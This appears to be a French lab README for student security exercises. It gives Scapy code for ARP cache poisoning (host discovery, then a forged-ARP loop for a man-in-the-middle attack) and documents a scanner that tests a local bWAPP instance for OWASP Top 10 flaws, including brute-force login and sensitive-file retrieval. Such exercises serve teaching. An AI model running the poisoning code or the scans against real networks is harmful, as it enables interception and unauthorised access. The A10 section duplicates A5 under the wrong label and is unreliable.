## 1. Exo 1 : ARP Cache Poisoning

L'attaque d'empoisonnement ARP vise à corrompre les tables ARP des machines sur un réseau local, ce qui peut être utilisé pour mener des attaques de type MITM (Man-in-the-Middle). Voici un workflow basique pour effectuer cette attaque en utilisant le module Scapy en Python :

### Etape 0 : Installation 
```bash
pip install scapy
```

### Etape 1 : Découverte des machines sur le réseau.
Envoyer des requêtes ARP pour découvrir les machines présentes sur le réseau.
```python
network = input("Adresse réseau à scanner (Ex : 192.168.1.0/24) : ")
arp = ARP(pdst=network)
ether = Ether(dst="ff:ff:ff:ff:ff:ff") 
packet = ether / arp

result = srp(packet, timeout=3, verbose=0)[0]
    
for sent, received in result:
    print("IP Address:", received.psrc, " MAC Address:", received.hwsrc)
```

### Etape 2 : Choix de la cible et de la machine attaquante.
Sélectionner une cible et configurer l'adresse MAC de la machine attaquante.

```python
target = input("Adresse IP de la cible : ")
impersonate = input("IP à usurpé : ")
```

### Etape 3 : Établir la table ARP corrompue.
Envoyer des réponses ARP falsifiées à la cible et à la passerelle pour les faire croire que l'adresse MAC de l'autre partie a changé.

```python
def arp_poisonning_attack(target, impersonate):
    my_mac = get_mac_address()
    packet = Ether()/ARP(op="who-has",hwsrc=my_mac,psrc=impersonate,pdst=target)
    sendp(packet, loop=1, inter=0.2)
```

## 2. Exo 2 : Documentation du scanner de vulnérabilité

Ce programme Python a été conçu pour détecter diverses vulnérabilités courantes dans les applications web. Il offre la possibilité de tester plusieurs types de vulnérabilités, telles que l'accès incorrect, les problèmes de chiffrement, les injections SQL, les injections XSS, les injections HTML, les failles de conception insecure design et les configurations de sécurité incorrectes sur des applications comme BWAPP.

### 2.1 Installation
```bash
pip install requests beautifulsoup4 colorama argparse
```

### 2.2 Utilisation 
Exécutez le programme `main.py` en utilisant Python avec les arguments appropriés. Voici la structure générale de la commande :
```bash 
python main.py --target <URL de la cible> --vuln <identifiant de la vulnérabilité>
```

Remplacez `URL de la cible` par l'adresse web de l'application à tester, et `identifiant de la vulnérabilité` par l'identifiant de la vulnérabilité que vous souhaitez tester.

**NB** : Certaine page nécessite d'être au préalable authentifier. dans ce cas vous devez ajouter l'option `--login_url` et spécifier où devront être envoyer les données pour l'authentiification ainsi que le `login` et le `password` séparé par des `:` comme l'exemple suivant : 
```bash
python main.py --target <URL de la cible> --vuln <identifiant de la vulnérabilité> --login_url <URL de connexion> --credentials username:password
```

### 2.3 Les options 
- `--target` : URL de la cible 
- `--vuln` : Identifiant de la vulnérabilité. (A1-10)
- `--login_url`: URL vers laquelle les données d'authentification sont envoyés. (La valeur par défaut est : `http://localhost/login.php`)
- `--credentials` : Login et mot de passe pour se connecter à l'application web dont on veut testé la vulnérabilité. (Valeur par défaut : `bee:bug`)

### 2.3 Exemples d'utilisation pour chaque vulnérabilité

Les Tests sont réalisées sur l'application bwapp qui tourne à l'adresse suivante : `http://localhost:9000`.

#### A01:2021 - Broken Access Control
```bash 
python main.py --target "http://localhost:9000" --vuln A1
```
Ce test vérifie la vulnérabilité aux accès non autorisés. Il tente d'accéder à des répertoires interdits et signale si l'accès est réussi.

#### A02:2021 - Cryptographic Failures
```bash 
python main.py --target "http://example.com" --vuln A2 --login_url "http://localhost:9000/login.php"
```
Ce test vérifie les échecs de chiffrement. Il tente de récupérer et décoder le secret chiffré à partir des cookies et signale s'il réussit.

#### A03:2021 - Injection
```bash 
python main.py --target "http://example.com" --vuln A3 --login_url "http://localhost:9000/login.php"
```
Ce test vérifie la vulnérabilité aux injections SQL, XSS et HTML. Il signale si les paramètres de l'URL sont vulnérables à ces types d'injections.

#### A04:2021 - Insecure Design
```bash 
python main.py --target "http://localhost:9000/login.php" --vuln A4
```
Ce test vérifie une conception insecure design. Il effectue plusieurs tentatives d'authentification et signale s'il y a un manque de défense contre les attaques par force brute.

#### A05:2021 - Security Misconfiguration
```bash 
python main.py --target "http://localhost:9000" --vuln A5
```
Ce test vérifie la sécurité de la configuration. Il tente de récupérer des fichiers sensibles à partir de répertoires mal configurés et signale s'il réussit.

#### A07:2021-Identification and Authentication Failures 
```bash 
python main.py --target "http://localhost:9000/login.php" --vuln A7
```
Ce test  vise à détecter les vulnérabilités liées à l'identification et à l'authentification dans une application Web. Elle tente des combinaisons de noms d'utilisateur et de mots de passe à partir de fichiers spécifiés pour déterminer si l'application est vulnérable aux attaques par force brute.

#### A08:2021-Software and Data Integrity Failures 
```bash 
python main.py --target "http://localhost:9000" --vuln A8
```
Ce test vise à détecter les vulnérabilités liées à l'intégrité logicielle et des données. Elle cherche des fichiers sensibles ou critiques dans un répertoire spécifique et tente de les télécharger pour vérifier la présence de failles.

#### A09:2021-Security Logging and Monitoring Failures
```bash 
python main.py --target "http://localhost:9000/directory_traversal_1.php?page=message.txt" --vuln A9 --login_url "http://localhost:9000/login.php"
```
Ce test vise à détecter les vulnérabilités liées à la journalisation et à la surveillance de sécurité. Elle effectue diverses tentatives d'accès aux répertoires et fichiers système pour vérifier si l'application permet un accès non autorisé.

#### A10:2021 - Security Misconfiguration
```bash 
python main.py --target "http://localhost:9000" --vuln A5
```
Ce test vérifie la sécurité de la configuration. Il tente de récupérer des fichiers sensibles à partir de répertoires mal configurés et signale s'il réussit.